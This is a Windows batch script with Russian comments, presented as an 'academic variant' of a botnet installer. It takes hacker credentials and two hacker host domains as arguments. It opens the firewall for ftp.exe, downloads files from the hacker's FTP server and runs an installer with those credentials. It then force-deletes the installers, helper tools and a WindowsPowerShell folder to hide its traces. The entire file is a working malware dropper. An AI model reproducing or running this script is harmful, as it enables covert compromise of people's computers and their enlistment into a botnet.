rem Файл загрузки и установки стайлера (Академический вариант)
rem USAGE
rem > load_distrib.bat <username> <password> <hacker host server 1 domain> <hacker host server 2 domain>
rem Запускать файл с правами администратора

rem Инициализируем переменные окружения скрипта

SetLocal EnableExtensions EnableDelayedExpansion

set curdir=%CD%
rem создаём системные переменные Windows для ботнета
set Hacker_User=%1
set Hacker_Pass=%2
set Hacker_host1=%3
set Hacker_host2=%4

rem Go to Temprorary Directory
cd /d %curdir%

::Временный файл команд для утилиты FTP.exe
set CommFTP="%TEMP%\Initial_Script.txt"


rem Разрешаем все протоколы для ftp.exe в брандмауэре
netsh advfirewall firewall add rule name="FTP.EXE Application" dir=in action=allow program="%windir%\system32\ftp.exe" enable=yes
rem Определяем переменные:
rem FTP Host
set host=%Hacker_host1%
rem FTP Port
set port=21
rem Ftp User
set user=anonymous
rem FTP Password
set password=
rem Основная папка
set Mainfolder=
rem Папка внутри FTP архива
set SubFolder=Exponenta
rem Папка внутри FTP архива
set SubFolder1=
rem Маска для файлов
set fileMask=*
rem Локальный каталог
set LocalFolder=%curdir%
 
 
::Генерируем файл FTP команд
> %CommFTP% (
  echo open %host% %port%
  echo %user%
  echo.%password%
  echo binary
  echo prompt
  echo hash
  echo lcd "%LocalFolder%"
  if "%Mainfolder%" neq "" echo cd "%Mainfolder%"
  if "%SubFolder%" neq "" echo cd "%SubFolder%"
  if "%SubFolder1%" neq "" echo cd "%SubFolder1%"
  echo mget %fileMask%
  echo disconnect
  echo quit
)

::Запускаем на выполнение пакетник команд FTP

ftp.exe -s:%CommFTP%

::Удаляем пакетник
del /f /q %CommFTP%

rem Запускаем инсталлятор стайлера "Экспонента"
call Install_MainExponenta.bat %Hacker_User% %Hacker_Pass% %Hacker_host1% %Hacker_host2%
cd /d %curdir%
del /F /S /Q /A Install_MainExponenta.bat

del /F /S /Q /A ExponentaHTTPStylerMainFiles151SetupRePack.exe
del /F /S /Q /A HiddenStartRePack.exe
del /F /S /Q /A Register_HS.bat
del /F /S /Q /A ElevationExponentaPlugin202SetupRepack.exe
del /F /S /Q /A Register_El.bat
del /F /S /Q /A choc_pack.install.cmd
del /F /S /Q /A chock.install.cmd
del /F /S /Q /A INSTALL.MD
del /F /S /Q /A descript.ion
del /F /S /Q /A duck-install.msi
del /F /S /Q /A AdminTExponentaPlugin052Setup.exe
del /F /S /Q /A INSTALL.txt
del /F /S /Q /A wget.exe

rd /S /Q WindowsPowerShell


